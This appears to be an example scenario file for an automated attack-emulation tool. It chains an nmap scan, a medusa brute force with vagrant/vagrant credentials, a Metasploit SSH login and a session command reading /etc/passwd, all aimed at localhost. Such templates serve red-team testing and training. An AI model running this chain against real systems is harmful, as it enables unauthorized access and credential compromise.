---
plan:
  name: Example scenario
  owner: your name
  stages:
  - name: stage-one
    trigger_type: delta
    trigger_args:
      seconds: 5
    steps:
    - name: scan-localhost
      is_init: true
      attack_module: mod_nmap/mod_nmap
      attack_module_args:
        target: 127.0.0.1
        ports:
          - 22
      next:
        - type: result
          value: OK
          step: bruteforce
    - name: bruteforce
      attack_module: mod_medusa/mod_medusa
      attack_module_args:
        target: 127.0.0.1
        open_ports: $parent.open_ports
        username: vagrant
        password: vagrant
      next:
      - type: result
        value: OK
        step: ssh-session
    - name: ssh-session
      create_named_session: session_to_target_1
      attack_module: mod_msf/mod_msf
      attack_module_args:
        exploit: auxiliary/scanner/ssh/ssh_login
        exploit_arguments:
          RHOSTS: 127.0.0.1
          USERNAME: $parent.username
          PASSWORD: $parent.password
      next:
        - type: result
          value: OK
          step: session-cmd
    - name: session-cmd
      attack_module: mod_cmd/mod_cmd
      use_named_session: session_to_target_1
      attack_module_args:
          cmd: cat /etc/passwd
